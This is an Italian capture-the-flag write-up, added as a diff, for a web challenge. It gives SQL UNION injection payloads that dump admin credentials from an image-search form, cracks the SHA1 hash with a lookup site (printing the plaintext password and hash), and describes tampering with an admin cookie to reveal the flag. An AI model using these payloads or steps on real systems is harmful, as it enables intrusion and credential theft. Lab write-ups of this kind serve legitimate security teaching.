@@ -1,0 +1,10 @@
+Writeup - gruppo 2
+La challenge riguarda Web-Security e si compone in due parti. Ci sarà un sito internet nel quale sarà possibile cercare immagini, inoltre è possibile accedere con utente specifico per accedere alla sezione di amministrazione.
+La prima parte consiste nell'effettuare un attacco sql-injection per rubare le credenziali dell'admin nel form adibito alla ricerca delle immagini. Comandi sql:
+a' UNION SELECT 1,table_name,3 FROM information_schema.tables #
+a' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name = 'cyberchallenge-users' #
+a' UNION SELECT Username,Password,3 FROM cyberchallenge_users #
+
+Una volta ottenute le credenziali si noterà che la password è hashata, in questo caso con sha1. Basterà utilizzare un sito che dispone di un motore di ricerca di hash pre-elaborati per trovare la password in chiaro (pwd = galletas : aa383514dfc5ba71b7337770718be76cc091e5e5).
+La seconda parte consiste nell'accedere alla pagina di amministrazione dove, però, nessuna flag verrà visualizzata finchè uno specifico cookie non sarà modificato in true. Ricaricando la pagina apparirà la flag!
+http://hackmepls.servehttp.com:7777/
